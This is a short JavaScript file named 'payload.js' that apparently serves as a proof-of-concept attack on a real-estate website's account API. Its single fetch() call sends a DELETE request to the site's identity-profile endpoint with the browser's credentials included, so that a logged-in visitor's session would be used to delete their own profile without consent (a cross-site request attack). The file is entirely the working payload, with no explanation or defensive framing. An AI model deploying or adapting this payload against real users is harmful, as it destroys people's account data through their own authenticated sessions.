// payload.js
fetch('https://www.compass.com/api/v3/identity_profile/client?json=%7B%7D', {
  headers: {
    'accept': '*/*',
    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6',
    'x-anonymous-id': '6ae4ec08-43d3-4d24-8936-d15e9787d426',
    'x-uc-referer': 'https://www.compass.com/account/'
  },
  referrer: 'https://www.compass.com/account/',
  referrerPolicy: 'strict-origin-when-cross-origin',
  body: null,
  method: 'DELETE',
  mode: 'cors',
  credentials: 'include'
});
